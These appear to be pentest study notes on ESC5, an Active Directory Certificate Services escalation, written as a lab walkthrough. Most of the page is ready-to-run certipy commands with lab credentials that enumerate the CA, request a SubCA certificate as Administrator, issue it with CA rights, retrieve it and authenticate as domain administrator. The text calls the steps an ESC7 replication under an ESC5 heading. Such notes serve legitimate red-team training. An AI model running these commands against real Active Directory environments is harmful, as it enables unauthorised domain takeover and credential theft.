---
description: Domain escalation that abuses access controls
---

# ESC5

ESC5 is a domain escalation technique that exploits weak access controls on Active Directory objects indirectly linked to ADCS. These objects can enable privilege escalation through ADCS.

{% hint style="info" %}
The entire Public Key Infrastructure or PKI can be compromised if an account has elevated privileges over objects tied to ADCS configuration or the ADCS server is compromised.
{% endhint %}

### <mark style="color:yellow;">ESC5 Abuse from Linux</mark>

Enumerate ADCS servier using `-ns` for DNS server IP and `-dns-tcp` so it uses TCP.

```sh
proxychains4 -q certipy find -u cken -p Superman001 -dc-ip 172.16.19.3 -stdout -ns 172.16.19.3 -dns-tcp
```

Replicate ESC7 attack using SubCA temmplate to generate a certificate as administrator. Specify `-target-ip <ADCS Server>` option since the ADCS server and the domain controller are different servers.

```sh
proxychains4 -q certipy req -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -template SubCA -upn Administrator
```

Approve the request using the right ID from previous step.

```sh
proxychains4 -q certipy ca -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -issue-request 10
```

Finally retrieve the certificate and authenticate

```sh
# Retrieve
proxychains4 -q certipy req -u cken -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -target-ip 172.16.19.5 -ca lab-WS01-CA -retrieve 10

# Authenticate
proxychains4 -q certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp
```
